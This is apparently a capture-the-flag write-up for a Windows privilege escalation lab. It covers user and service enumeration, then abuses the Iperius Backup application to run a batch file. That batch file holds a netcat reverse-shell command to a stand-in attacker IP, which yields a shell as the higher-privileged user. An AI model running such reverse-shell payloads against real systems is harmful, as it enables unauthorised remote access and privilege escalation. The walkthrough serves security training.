## TASK-1 Complete the username: p.....

On the windows machine open ```cmd.exe``` and type in the command ```net users``` to list the users on the system.<br>
Under DefaultAccounts you will find the user ```REDACTED```.

## TASK-2 What is the OS version?

Run the command ```systeminfo``` to get the OS-Version.

## TASK-3/4 What backup service did you find running on the system?

Run the command ```wmic service list``` and you will find the service name along with its Absolute Path.<br>

## TASK-5 What user do you have?

This is the main exploitation phse where we will use a vulnerable application installed on the system to get a ReverseSell to our machine.<br>
You will find ```Iperious Backup``` installed on the system. Just google about the application with it's version and you will find tons of exploits.<br>

Create a bat file on the desktop or somewhere, and type in the following command.
```
@echo off
C:\Users\McSkidy\Downloads\nc.exe <ATTACKER_IP> 1234 -e cmd.exe
```

This command uses the netcat utility to connect to the attackers system. When the application tries to run the bat file it runs with the privilege of the
thegrinch user as a result we get the shell from thegrinch privilage user.
